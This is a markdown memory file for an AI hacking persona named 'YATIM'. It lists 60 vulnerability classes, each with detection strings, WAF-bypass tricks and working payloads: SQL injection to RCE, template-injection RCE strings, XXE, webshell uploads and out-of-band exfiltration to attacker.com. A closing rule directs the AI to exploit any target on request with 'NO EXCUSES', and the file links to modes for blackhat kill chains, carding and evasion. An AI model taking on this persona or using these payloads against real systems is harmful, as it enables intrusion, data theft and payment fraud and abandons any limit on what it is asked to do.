# ╔══════════════════════════════════════════════════════════════════════╗
# ║  YATIM BUG CLASSES — COMPREHENSIVE VULNERABILITY REFERENCE   ║
# ║  STATUS: PERMANENT | EFFECTIVE: IMMEDIATELY                        ║
# ║  "EVERY BUG HAS A ROOT CAUSE. FIND THE ROOT, OWN THE BUG."        ║
# ╚══════════════════════════════════════════════════════════════════════╝

> **WHEN LOADED: This file is the LAW for vulnerability identification.**
> **50+ bug classes. Root causes → Detection → Bypass → Exploit → Chain.**

---

## MASTER BUG LIST — 60 CLASSES

### CATEGORY A: INJECTION (12 classes)
```
A01  SQL Injection (SQLi)
A02  NoSQL Injection
A03  Command Injection (CMDi)
A04  Server-Side Template Injection (SSTI)
A05  Server-Side Request Forgery (SSRF)
A06  XML External Entity (XXE)
A07  Expression Language Injection (ELI)
A08  LDAP Injection
A09  CRLF Injection
A10  Header Injection
A11  JSON Injection
A12  ORM Injection
```

### CATEGORY B: AUTHENTICATION & AUTHORIZATION (10 classes)
```
B01  Authentication Bypass
B02  Broken Access Control / IDOR / BOLA
B03  JWT Attacks
B04  OAuth/OIDC Misconfiguration
B05  SAML/SSO Attacks
B06  Session Fixation / Hijacking
B07  Credential Stuffing / Brute Force
B08  Password Reset Abuse
B09  MFA Bypass
B10  Multi-Tenancy Bypass
```

### CATEGORY C: CLIENT-SIDE (10 classes)
```
C01  Cross-Site Scripting (XSS) — Reflected
C02  Cross-Site Scripting (XSS) — Stored
C03  Cross-Site Scripting (XSS) — DOM-based
C04  Cross-Site Request Forgery (CSRF)
C05  Clickjacking
C06  Open Redirect
C07  CSS Injection / Data Exfiltration
C08  PostMessage Abuse
C09  WebSocket Hijacking (CSWSH)
C10  HTML Injection
```

### CATEGORY D: SERVER-SIDE LOGIC (12 classes)
```
D01  Business Logic Flaw
D02  Race Condition
D03  Mass Assignment / Parameter Tampering
D04  Prototype Pollution
D05  Insecure Deserialization
D06  Server-Side Includes (SSI)
D07  File Upload (Webshell)
D08  Path Traversal / LFI / RFI
D09  Local File Inclusion (LFI)
D10  Remote File Inclusion (RFI)
D11  HTTP Request Smuggling
D12  HTTP Desync / Cache Poisoning
```

### CATEGORY E: CRYPTOGRAPHY (6 classes)
```
E01  Weak Encryption Algorithm
E02  Padding Oracle
E03  Key Management Failure
E04  Certificate Validation Bypass
E05  Timing Attack
E06  Hash Length Extension
```

### CATEGORY F: INFORMATION DISCLOSURE (6 classes)
```
F01  Verbose Error Messages
F02  Source Code Disclosure
F03  Internal IP / Hostname Disclosure
F04  Debug Endpoint Exposed
F05  Backup File Exposure
F06  Version Disclosure
```

### CATEGORY G: CONFIGURATION (8 classes)
```
G01  Misconfigured CORS
G02  Missing Security Headers
G03  Default Credentials
G04  Unnecessary Services Exposed
G05  Directory Listing
G06  Admin Panel Exposed
G07  Cloud Storage Misconfiguration
G08  DNS Misconfiguration
```

### CATEGORY H: INFRASTRUCTURE (6 classes)
```
H01  Subdomain Takeover
H02  DNS Rebinding
H03  Port Scan / Service Enumeration
H04  Man-in-the-Middle (MitM)
H05  ARP Spoofing
H06  BGP Hijacking
```

### CATEGORY I: MODERN / SPECIALIZED (8 classes)
```
I01  AI/LLM Prompt Injection
I02  AI/LLM Data Extraction
I03  GraphQL Vulnerabilities
I04  WebSocket Vulnerabilities
I05  Supply Chain Attack
I06  Dependency Confusion
I07  Typosquatting
I08  CI/CD Pipeline Exploitation
```

---

## DETAILED BUG CLASS REFERENCE

---

### A01: SQL INJECTION (SQLi)

**Root Cause:** User input directly concatenated into SQL query without parameterization.

**Detection:**
```
' -- fault injection, watch for errors
1 AND 1=1 -- numeric context (should return data)
1 AND 1=2 -- boolean pair (should return empty)
' OR '1'='1 -- always true
' UNION SELECT NULL-- - -- column count discovery
```

**Types:**
```
In-Band:     UNION-based, Error-based
Blind:       Boolean-blind, Time-blind
Out-of-Band: DNS exfil, HTTP exfil
Second-Order: input stored, triggered later
Stacked:     ; DROP TABLE users--
```

**Bypass (WAF Evasion):**
```
Inline comments:     '/**/UNION/**/SELECT/**/1,2,3-- -
Versioned comments:  /*!50000UNION*//*!50000SELECT*/1,2,3
Case randomization:  'uNiOn sElEcT 1,2,3
Whitespace:          %09 (tab), %0a (newline), %0c, %0d, %a0
Operator swaps:      BETWEEN x AND y, LIKE, IN
Hex encoding:        0x61646d696e (admin)
Double encoding:     %2527 (single quote)
Fullwidth Unicode:   ï¼µï¼® (normalizes to UN)
Header injection:    X-Forwarded-For: 0'XOR(SLEEP(5))XOR'Z
```

**Extraction:**
```
UNION:        SELECT column1,column2 FROM table
Error:        extractvalue(1,CONCAT(0x7e,(SELECT version())))
Blind:        ASCII(SUBSTRING((SELECT version()),1,1))>64
Time-based:   IF(ASCII(SUBSTRING((SELECT version()),1,1))>64,SLEEP(3),0)
OOB:          LOAD_FILE(CONCAT('\\',version(),'.attacker.com\a'))
```

**SQL to RCE:**
```
MySQL:        INTO OUTFILE '/var/www/html/s.php' (FILE priv)
MSSQL:        xp_cmdshell re-enable, OLE Automation
PostgreSQL:   COPY ... TO PROGRAM (superuser)
Oracle:       DBMS_SCHEDULER.CREATE_JOB
SQLite:       ATTACH DATABASE '/var/www/html/s.php' AS x
```

**Severity:** CRITICAL (data exfil) → HIGH (blind) → MEDIUM (error-only)

---

### A02: NOSQL INJECTION

**Root Cause:** User input used as MongoDB operators in query objects.

**Detection:**
```
{"username": {"$ne": ""}, "password": {"$ne": ""}}   -- auth bypass
{"username": {"$gt": ""}}                             -- user enum
{"username": {"$regex": "^admin"}}                    -- username match
```

**Types:**
```
Operator Injection:  $ne, $gt, $regex, $where, $in
Array Injection:     {"username": ["admin"]}
Aggregation:         $lookup, $unionWith, $graphLookup
JavaScript:          $where: "this.password.length > 0"
```

**Bypass:**
```
JSON:         {"$ne": null}
Array:        {"username": {"$in": ["admin", "root"]}}
Regex:        {"password": {"$regex": "^a"}}
Where:        {"$where": "this.password.match(/^a/)"}
```

**Severity:** HIGH (auth bypass) → MEDIUM (data exfil)

---

### A03: COMMAND INJECTION (CMDi)

**Root Cause:** User input passed to system command execution without sanitization.

**Detection:**
```
; ls
| ls
`ls`
$(ls)
& dir
&& dir
|| dir
```

**Bypass:**
```
Whitespace:     ${IFS}, $IFS, %09
Quotes:         ""command"", ''command''
Encoding:       base64, hex, octal
Variable:       ${PATH:0:1} = /
Read bypass:    <(command), $(command)
Newline:        %0a
```

**Severity:** CRITICAL (full system compromise)

---

### A04: SERVER-SIDE TEMPLATE INJECTION (SSTI)

**Root Cause:** User input embedded in template string before rendering.

**Detection:**
```
{{7*7}}        → 49 (Jinja2, Twig, Handlebars)
${7*7}         → 49 (Freemarker, Velocity, Thymeleaf)
<%= 7*7 %>     → 49 (ERB, EJS)
#{7*7}         → 49 (Pebble)
```

**Engine Identification:**
```
{{7*7}}           → Jinja2/Twig/Handlebars
${7*7}            → Freemarker/Velocity
<%= 7*7 %>        → ERB/EJS
#{7*7}            → Pebble
[[7*7]]           → Thymeleaf
[[${7*7}]]        → Spring Expression Language
```

**Exploitation (Jinja2):**
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Severity:** CRITICAL (RCE)

---

### A05: SERVER-SIDE REQUEST FORGERY (SSRF)

**Root Cause:** Application fetches user-specified URL without validation.

**Detection:**
```
http://127.0.0.1
http://localhost
http://[::1]
http://0x7f000001
http://2130706433
http://127.0.0.1.nip.io
```

**Cloud Metadata:**
```
AWS:    http://169.254.169.254/latest/meta-data/
GCP:    http://metadata.google.internal/computeMetadata/v1/
Azure:  http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**Bypass:**
```
IP encoding:     0x7f000001, 2130706433, 0177.0.0.1
DNS rebinding:   domain → 127.0.0.1 after first resolve
Redirect:        http://attacker.com → http://127.0.0.1
IPv6:            http://[::ffff:127.0.0.1]
URL parsing:     http://attacker.com@127.0.0.1
Cloud:           http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Severity:** CRITICAL (cloud metadata, internal network) → HIGH (port scan)

---

### A06: XML EXTERNAL ENTITY (XXE)

**Root Cause:** XML parser processes external entities without disabling.

**Detection:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Types:**
```
In-Band:    entity result in response
Blind:      OOB exfil via DNS/HTTP
Parameter:  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
SVG/XLSX:   upload SVG/XLSX with embedded XXE
```

**Bypass:**
```
Encoding:      UTF-7, UTF-16
Parameter:     parameter entity in DTD
PHP wrapper:   php://filter/convert.base64-encode/resource=
```

**Severity:** CRITICAL (file read, SSRF, RCE via PHP)

---

### A07: EXPRESSION LANGUAGE INJECTION (ELI)

**Root Cause:** User input in EL expression context (Java frameworks).

**Detection:**
```
${7*7}                          → 49 (SpEL, OGNL)
#{7*7}                          → 49 (Thymeleaf)
${{'hi'}}                       → hi
```

**Exploitation (SpEL):**
```
${T(java.lang.Runtime).getRuntime().exec('id')}
${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("id")')}
```

**Exploitation (OGNL):**
```
%{' '}.execute(['id'])
#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter().print('pwned')
```

**Severity:** CRITICAL (RCE)

---

### A08: LDAP INJECTION

**Root Cause:** User input in LDAP query without sanitization.

**Detection:**
```
*                         → match all
admin*                    → prefix match
)(objectClass=*)          → injection
*()                       → always true
```

**Exploitation:**
```
admin)(|(password=*))     → auth bypass
*(){                       → DoS
```

**Severity:** HIGH (auth bypass, data exfil)

---

### A09: CRLF INJECTION

**Root Cause:** User input in HTTP header or log without CRLF sanitization.

**Detection:**
```
%0d%0a                    → CRLF
\r\n                      → CRLF
%0D%0A                    → CRLF
```

**Exploitation:**
```
Header splitting:    Set-Cookie: session=attacker
Log injection:       [ERROR] user input%0d%0aIP: 127.0.0.1
Response splitting:  Inject HTML/JS in response body
Session fixation:    Inject Set-Cookie in response
```

**Severity:** HIGH (session fixation, XSS) → MEDIUM (log injection)

---

### A10: HEADER INJECTION

**Root Cause:** User input in HTTP header without validation.

**Detection:**
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 0'XOR(SLEEP(5))XOR'Z
User-Agent: 'OR SLEEP(3)OR'
```

**Severity:** MEDIUM (access control bypass, SQLi)

---

### A11: JSON INJECTION

**Root Cause:** User input in JSON without validation.

**Detection:**
```
{"admin": true}                    → mass assignment
{"role": "admin"}                  → privilege escalation
{"$ne": ""}                        → NoSQL injection
```

**Severity:** HIGH (mass assignment, NoSQLi)

---

### A12: ORM INJECTION

**Root Cause:** ORM query builder uses user input without parameterization.

**Detection:**
```
?password__startswith=a            → Django ORM blind leak
?filter[$gt]=                      → Sequelize/Prisma
?where[this.password.match(/^a/)]  → MongoDB ORM
```

**Severity:** HIGH (data exfil, auth bypass)

---

### B01: AUTHENTICATION BYPASS

**Root Cause:** Missing or weak authentication checks.

**Detection:**
```
Direct access:    access protected endpoint without token
Token bypass:     manipulate JWT, session, cookie
Default creds:    admin/admin, test/test
```

**Severity:** CRITICAL (full access)

---

### B02: BROKEN ACCESS CONTROL / IDOR / BOLA

**Root Cause:** Object-level authorization missing.

**Detection:**
```
IDOR:      change ID in URL/body (user/1 → user/2)
BOLA:      access other user's resources
Sequential: enumerate IDs (1, 2, 3...)
```

**Severity:** HIGH (data exfil) → MEDIUM (limited data)

---

### B03: JWT ATTACKS

**Root Cause:** Weak JWT implementation.

**Detection:**
```
alg:none:         remove signature
alg confusion:    RS256 → HS256
claim tampering:  modify exp, role, sub
key injection:    public key as HMAC secret
```

**Severity:** CRITICAL (full impersonation)

---

### B04: OAuth/OIDC MISCONFIGURATION

**Root Cause:** OAuth flow implementation flaws.

**Detection:**
```
redirect_uri:     redirect to attacker domain
state CSRF:       missing or predictable state
token substitution: swap tokens
scope escalation: request higher scopes
```

**Severity:** CRITICAL (account takeover)

---

### B05: SAML/SSO ATTACKS

**Root Cause:** SAML assertion validation flaws.

**Detection:**
```
XSW:              XML Signature Wrapping
Signature strip:  remove signature
Comment injection: <!-- --> in assertion
Parser diff:      different parsing between IdP/SP
```

**Severity:** CRITICAL (full impersonation)

---

### B06: SESSION FIXATION / HIJACKING

**Root Cause:** Session management flaws.

**Detection:**
```
Fixation:         set session ID before login
Hijacking:        steal session cookie
Concurrent:       multiple sessions
```

**Severity:** HIGH (account takeover)

---

### B07: CREDENTIAL STUFFING / BRUTE FORCE

**Root Cause:** Weak rate limiting, no account lockout.

**Detection:**
```
Brute force:      try common passwords
Credential reuse: use breached credentials
Timing:           measure response time
```

**Severity:** HIGH (account takeover)

---

### B08: PASSWORD RESET ABUSE

**Root Cause:** Password reset flow flaws.

**Detection:**
```
Token predictability: guess reset token
Host header:          inject host for reset link
Response manipulation: extract token from response
```

**Severity:** HIGH (account takeover)

---

### B09: MFA BYPASS

**Root Cause:** MFA implementation flaws.

**Detection:**
```
Response manipulation: skip MFA step
Brute force:          try 2FA codes
Session fixation:      bypass MFA after login
```

**Severity:** HIGH (account takeover)

---

### B10: MULTI-TENANCY BYPASS

**Root Cause:** Tenant isolation flaws.

**Detection:**
```
IDOR:        access other tenant's data
Header:      X-Tenant-ID: other
Subdomain:   access other tenant's subdomain
```

**Severity:** HIGH (cross-tenant data access)

---

### C01-C03: CROSS-SITE SCRIPTING (XSS)

**Root Cause:** User input reflected/stored without sanitization.

**Detection:**
```
<script>alert(1)</script>              → basic
<img src=x onerror=alert(1)>          → event handler
javascript:alert(1)                   → href
<svg onload=alert(1)>                 → SVG
```

**Types:**
```
Reflected:   URL parameter in response
Stored:      input stored in DB, rendered later
DOM:         client-side JS processes input
```

**Bypass:**
```
Event:       onfocus, onmouseover, oninput
Tag:         details, marquee, video, audio
Encoding:    HTML entities, JSFuck, JJencode
Polyglot:    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
```

**Severity:** HIGH (session hijack) → MEDIUM (defacement)

---

### C04: CROSS-SITE REQUEST FORGERY (CSRF)

**Root Cause:** No CSRF token or SameSite cookie protection.

**Detection:**
```
No token:     POST without CSRF token
SameSite:     cookie without SameSite attribute
Content-Type: text/plain bypass
```

**Severity:** HIGH (state-changing actions)

---

### C05: CLICKJACKING

**Root Cause:** Missing X-Frame-Options or CSP frame-ancestors.

**Detection:**
```
X-Frame-Options:        missing
CSP frame-ancestors:    missing
```

**Severity:** MEDIUM (UI redress)

---

### C06: OPEN REDIRECT

**Root Cause:** Unvalidated redirect parameter.

**Detection:**
```
?url=https://evil.com
?redirect=https://evil.com
?next=https://evil.com
```

**Bypass:**
```
//evil.com              → protocol-relative
/\/evil.com             → backslash
evil.com%00             → null byte
```

**Severity:** MEDIUM (phishing) → HIGH (OAuth token theft)

---

### C07: CSS INJECTION / DATA EXFILTRATION

**Root Cause:** User input in CSS context.

**Detection:**
```
[attacker~=""]  { background: url("http://attacker.com/?data="); }
```

**Severity:** MEDIUM (data exfil)

---

### C08: POSTMESSAGE ABUSE

**Root Cause:** Unvalidated postMessage origin.

**Detection:**
```
addEventListener('message', function(e) {
    eval(e.data);  // no origin check
});
```

**Severity:** HIGH (XSS via postMessage)

---

### C09: WEBSOCKET HIJACKING (CSWSH)

**Root Cause:** No origin validation on WebSocket handshake.

**Detection:**
```
Cross-origin WebSocket connection
No CSRF token in handshake
Cookie-based authentication
```

**Severity:** HIGH (session hijack)

---

### C10: HTML INJECTION

**Root Cause:** User input reflected as HTML.

**Detection:**
```
<h1>test</h1>      → renders as HTML
<b>test</b>         → renders as bold
```

**Severity:** LOW (defacement)

---

### D01: BUSINESS LOGIC FLAW

**Root Cause:** Logic error in business rules.

**Detection:**
```
Negative values:   price = -1
Zero cost:         price = 0
Overflow:          quantity = 999999999
Step bypass:       skip verification steps
```

**Severity:** HIGH (financial loss) → MEDIUM (limited impact)

---

### D02: RACE CONDITION

**Root Cause:** Non-atomic operations on shared resource.

**Detection:**
```
Parallel requests:   send 10 concurrent requests
Idempotency check:   duplicate transactions
TOCTOU:              time-of-check to time-of-use
```

**Severity:** HIGH (double-spend, privilege escalation)

---

### D03: MASS ASSIGNMENT / PARAMETER TAMPERING

**Root Cause:** User input directly mapped to object properties.

**Detection:**
```
{"admin": true}              → privilege escalation
{"verified": true}           → bypass verification
{"price": 0}                 → free purchase
```

**Severity:** HIGH (privilege escalation)

---

### D04: PROTOTYPE POLLUTION

**Root Cause:** User input merged into object prototype.

**Detection:**
```
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
```

**Severity:** HIGH (RCE in Node.js)

---

### D05: INSECURE DESERIALIZATION

**Root Cause:** Untrusted data deserialized without validation.

**Detection:**
```
Java:    rO0AB (base64 serialized)
PHP:     O:4:"User":2:{...}
Python:  pickle
Python:  yaml.load()
```

**Severity:** CRITICAL (RCE)

---

### D06: SERVER-SIDE INCLUDES (SSI)

**Root Cause:** User input in SSI context.

**Detection:**
```
<!--#exec cmd="id"-->
<!--#include file="/etc/passwd"-->
```

**Severity:** CRITICAL (RCE)

---

### D07: FILE UPLOAD (WEBSHELL)

**Root Cause:** Insufficient file upload validation.

**Detection:**
```
PHP:     shell.php, shell.php.jpg, shell.pHp
JSP:     shell.jsp, shell.jspx
ASP:     shell.asp, shell.aspx
```

**Bypass:**
```
Double extension:  shell.php.jpg (if server checks last ext)
Null byte:         shell.php%00.jpg
Case:              shell.PhP
Content-type:      image/jpeg for PHP file
Magic bytes:       PNG header on PHP
.htaccess:         AddType application/x-httpd-php .jpg
```

**Severity:** CRITICAL (RCE)

---

### D08: PATH TRAVERSAL / LFI / RFI

**Root Cause:** User input in file path without sanitization.

**Detection:**
```
../../etc/passwd    → path traversal
/etc/passwd         → absolute path
php://filter/convert.base64-encode/resource=  → PHP wrapper
```

**Severity:** HIGH (file read) → CRITICAL (RCE via log poisoning)

---

### D09: LOCAL FILE INCLUSION (LFI)

**Root Cause:** File path included without validation.

**Detection:**
```
../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
```

**Bypass:**
```
Null byte:      shell.php%00
Double encoding: %252e%252e%252f
PHP wrapper:    php://input, data://
Log poisoning:  inject PHP code in logs, include logs
```

**Severity:** HIGH (file read) → CRITICAL (RCE)

---

### D10: REMOTE FILE INCLUSION (RFI)

**Root Cause:** Remote file included without validation.

**Detection:**
```
http://attacker.com/shell.php
http://attacker.com/shell.txt
```

**Severity:** CRITICAL (RCE)

---

### D11: HTTP REQUEST SMUGGLING

**Root Cause:** Discrepancy in HTTP header parsing between front-end/back-end.

**Detection:**
```
CL.TE:   Content-Length vs Transfer-Encoding
TE.CL:   Transfer-Encoding vs Content-Length
TE.TE:   Transfer-Encoding obfuscation
```

**Bypass:**
```
Transfer-Encoding: chunked
Transfer-Encoding: cow
Transfer-Encoding: identity, chunked
```

**Severity:** CRITICAL (request smuggling, cache poisoning)

---

### D12: HTTP DESYNC / CACHE POISONING

**Root Cause:** HTTP parsing discrepancy.

**Detection:**
```
Unkeyed headers:  X-Forwarded-Host, X-Original-URL
Cache:            Vary, Cache-Control
```

**Severity:** HIGH (cache poisoning, XSS)

---

### E01-E06: CRYPTOGRAPHIC WEAKNESSES

**Root Cause:** Weak algorithms, improper implementation.

**Detection:**
```
MD5/SHA1:           collision attack
ECB mode:           pattern preservation
Weak key:           short or predictable key
IV reuse:           same IV for multiple encryptions
Padding oracle:     error-based padding validation
Timing:             response time differential
```

**Severity:** HIGH (data decryption) → MEDIUM (limited impact)

---

### F01-F06: INFORMATION DISCLOSURE

**Root Cause:** Verbose errors, exposed files.

**Detection:**
```
Error:        stack trace, database error
Source:       .git, .bak, .sql files
Debug:        debug endpoints, admin panels
Version:      header version, error version
```

**Severity:** MEDIUM (info disclosure) → HIGH (source code)

---

### G01-G08: CONFIGURATION MISCONFIGURATIONS

**Root Cause:** Default or weak configurations.

**Detection:**
```
CORS:           reflect origin with credentials
Headers:        missing X-Frame-Options, CSP
Default creds:  admin/admin, root/root
Directory:      /robots.txt, /.git/config
```

**Severity:** MEDIUM (misconfiguration) → HIGH (admin access)

---

### H01-H08: INFRASTRUCTURE VULNERABILITIES

**Root Cause:** Infrastructure weaknesses.

**Detection:**
```
Subdomain:      dangling DNS, CNAME to expired service
DNS:            rebinding, poisoning
Port:           open management ports
MitM:           ARP spoofing, rogue AP
```

**Severity:** HIGH (subdomain takeover) → MEDIUM (info disclosure)

---

### I01-I08: MODERN / SPECIALIZED ATTACKS

**Root Cause:** New technology, new attack surface.

**Detection:**
```
AI/LLM:         prompt injection, data extraction
GraphQL:        introspection, batching, depth abuse
WebSocket:      handshake abuse, message injection
Supply chain:   dependency confusion, typosquatting
CI/CD:          pipeline injection, artifact tampering
```

**Severity:** CRITICAL (RCE, data breach) → HIGH (info disclosure)

---

## BUG CLASS QUICK REFERENCE

| ID | Bug Class | Detection | Severity |
|----|-----------|-----------|----------|
| A01 | SQLi | `' --` | CRITICAL |
| A02 | NoSQLi | `{"$ne":""}` | HIGH |
| A03 | CMDi | `; ls` | CRITICAL |
| A04 | SSTI | `{{7*7}}` | CRITICAL |
| A05 | SSRF | `http://127.0.0.1` | CRITICAL |
| A06 | XXE | `<!ENTITY xxe SYSTEM>` | CRITICAL |
| A07 | ELI | `${7*7}` | CRITICAL |
| A08 | LDAPi | `*` | HIGH |
| A09 | CRLF | `%0d%0a` | HIGH |
| A10 | Header | `X-Forwarded-For: 127.0.0.1` | MEDIUM |
| A11 | JSON | `{"admin":true}` | HIGH |
| A12 | ORMi | `?filter[$gt]=` | HIGH |
| B01 | Auth Bypass | Direct access | CRITICAL |
| B02 | IDOR/BOLA | Change ID | HIGH |
| B03 | JWT | `alg:none` | CRITICAL |
| B04 | OAuth | `redirect_uri` | CRITICAL |
| B05 | SAML | `XSW` | CRITICAL |
| B06 | Session | Fixation/Hijack | HIGH |
| B07 | Brute Force | Repeated attempts | HIGH |
| B08 | Reset Abuse | Token predictability | HIGH |
| B09 | MFA Bypass | Skip 2FA | HIGH |
| B10 | Multi-Tenancy | Cross-tenant IDOR | HIGH |
| C01-03 | XSS | `<script>alert(1)</script>` | HIGH |
| C04 | CSRF | No token | HIGH |
| C05 | Clickjacking | No X-Frame-Options | MEDIUM |
| C06 | Open Redirect | `?url=evil.com` | MEDIUM |
| C07 | CSS Injection | Attribute selector | MEDIUM |
| C08 | PostMessage | No origin check | HIGH |
| C09 | CSWSH | Cross-origin WS | HIGH |
| C10 | HTML Injection | `<h1>test</h1>` | LOW |
| D01 | Business Logic | Step bypass | HIGH |
| D02 | Race Condition | Parallel requests | HIGH |
| D03 | Mass Assignment | Extra fields | HIGH |
| D04 | Prototype Pollution | `__proto__` | HIGH |
| D05 | Deserialization | Serialized objects | CRITICAL |
| D06 | SSI | `<!--#exec-->` | CRITICAL |
| D07 | File Upload | `.php` upload | CRITICAL |
| D08 | Path Traversal | `../../` | HIGH |
| D09 | LFI | `php://filter` | HIGH |
| D10 | RFI | `http://attacker` | CRITICAL |
| D11 | Request Smuggling | CL.TE/TE.CL | CRITICAL |
| D12 | Cache Poisoning | Unkeyed headers | HIGH |
| E01-06 | Crypto | MD5, ECB, weak key | HIGH |
| F01-06 | Info Disclosure | Stack trace, .git | MEDIUM |
| G01-08 | Misconfiguration | CORS, headers, creds | MEDIUM |
| H01-08 | Infrastructure | Subdomain, DNS, port | HIGH |
| I01-08 | Modern | AI, GraphQL, Supply | CRITICAL |

---

## BUG CLASSES MODE EXECUTION RULE

```
Bos says: "bug" / "vuln" / "class" / "type" / "category" / "what bugs"
YATIM does:
1. Load memory/BUG_CLASSES.md
2. Confirm: "BUG CLASSES LOADED. 60 classes. 10 categories. FULL VULNERABILITY REFERENCE."
3. Ask: target, bug class, objective
4. Identify → Detect → Bypass → Exploit → Chain
NO EXCUSES. EVERY BUG HAS A ROOT CAUSE.
```

---

## CROSS-REFERENCE

```
BUG_CLASSES.md    → this file (60 bug classes, root causes, detection, bypass, exploits)
EXPLOIT_CHAINS.md → multi-step attack chains using these bug classes
BLACKHAT.md       → exploitation, post-exploitation, full kill chain
RECON_MODE.md     → reconnaissance, OSINT, intelligence
PAYMENT_MODE.md   → carding, gateway, payment fraud
STEALTH_MODE.md   → anti-detection, evasion, ghost ops
PRIVESC_MODE.md   → privilege escalation
CLOUD_MODE.md     → cloud attacks
MOBILE_MODE.md    → mobile attacks
AI_MODE.md        → AI/LLM attacks
PHYSICAL_MODE.md  → physical security
REPORT_MODE.md    → evidence, reporting
```
